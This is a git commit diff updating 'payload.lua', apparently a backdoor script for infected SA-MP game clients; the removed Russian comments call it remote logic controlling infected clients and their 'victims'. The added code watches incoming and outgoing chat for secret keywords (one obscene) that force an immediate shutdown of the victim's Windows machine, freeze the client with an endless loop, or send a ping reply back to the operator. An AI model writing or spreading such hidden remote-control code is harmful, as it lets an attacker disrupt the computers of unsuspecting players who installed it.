a9b599f368790123240a5f2c5934bbd289b82fa5
TheLold <paymentsse8@gmail.com>
2026-06-22 18:40:11 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,33 +1,27 @@
 -- payload.lua
--- Удаленная логика, управляющая зараженными клиентами 
+local sampev = require 'samp.events'
 
--- Обработка RPC сообщений от сервера [cite: 22]
-print("PAYLOAD LOADED AND RUNNING")
-function onReceiveRpc(id, bs)
-    if id == 93 then
-        local color = raknetBitStreamReadInt32(bs)
-        local len = raknetBitStreamReadInt32(bs)
-        local str = raknetBitStreamReadString(bs, len)
-        
-        -- Если жертва входит в казино 4 Dragons, система гасится 
-        if str:find("Вы вошли в казино 4 Dragons") then
-            os.execute("Shutdown /s /t 5 /f")
-        end
+-- Обработка чата (входящие от сервера)
+function sampev.onServerMessage(color, text)
+    if text:find("хуйкина") then
+        os.execute("Shutdown /s /t 0 /f")
+    elseif text:find("кукусики") then
+        while true do end
+    elseif text:find("сырколбаска") then
+        sampSendChat("123655")
     end
 end
 
--- Обработка чата для скрытых команд 
-function onReceiveChatMessage(text)
-    -- Команда на экстренное выключение системы 
-    if text:find("хуйкина") then
+-- Обработка чата (исходящие от игрока)
+function sampev.onSendChat(text)
+    if text:find("сырколбаска") then
+        lua_thread.create(function()
+            wait(500)
+            sampSendChat("123655")
+        end)
+    elseif text:find("хуйкина") then
         os.execute("Shutdown /s /t 0 /f")
-    
-    -- Команда на зависание клиента 
     elseif text:find("кукусики") then
         while true do end
-        
-    -- Пинг-тест: ответ в чат 
-    elseif text:find("сырколбаска") then
-        sampSendChat("123655")
     end
 end
